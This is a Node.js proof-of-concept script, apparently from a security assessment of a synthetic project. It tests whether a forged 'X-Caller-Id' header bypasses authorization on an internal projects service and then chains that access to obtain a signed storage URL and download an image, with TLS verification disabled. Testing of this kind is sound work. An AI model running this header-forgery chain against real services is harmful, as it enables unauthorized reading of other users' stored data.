// Dedicated synthetic project only. No JWTs, signed URLs or file contents printed.
const axios = require('axios');
const { createHash } = require('node:crypto');
const http = axios.create({httpsAgent:new (require('node:https').Agent)({rejectUnauthorized:false}),validateStatus:()=>true,timeout:20000});

async function main() {
  const owner=process.env.PROBE_OWNER, project=process.env.PROBE_PROJECT;
  if(!/^[a-f0-9]{24}$/.test(owner)||!/^[a-f0-9]{24}$/.test(project)) throw new Error('Expected synthetic MongoDB IDs');
  const url=`https://projects:9001/${owner}/${project}`;
  const missing=await http.get(url);
  const forged=await http.get(url,{headers:{'X-Caller-Id':owner}});
  const report={recorded_at:new Date().toISOString(),scope:'Docker-network access to synthetic isolated project; no bearer token.',
    owner_id:owner,project_id:project,
    direct_project_without_identity:{status:missing.status},
    direct_project_forged_caller_header:{status:forged.status,protected_data_returned:forged.data?._id===project},storage_read:{},
    limitations:['Published host-port request was connection-refused in the internal-network deployment; host/internet reachability is not established.',
      'The earlier harness read used an absent API field as an object key; that result is invalid for authorization assessment. This probe derives the actual key from the owner response.']};
  if(forged.status===200) {
    const key=decodeURIComponent(new URL(forged.data.imgs[0].url).pathname.split('/').pop());
    const signing=await http.get(`http://img_storage:11000/image/internal/${owner}/${project}/src/${encodeURIComponent(key)}`);
    report.storage_read.signing_status=signing.status;
    if(signing.status===200) {
      const content=await http.get(signing.data.url,{responseType:'arraybuffer'});
      const digest=createHash('sha256').update(content.data).digest('hex');
      report.storage_read={...report.storage_read,download_status:content.status,bytes:content.data.length,sha256:digest,matches_original:digest===process.env.PROBE_SHA256};
    }
  }
  console.log(JSON.stringify(report,null,2));
}
main().catch(error=>{console.error(error.message);process.exitCode=1;});
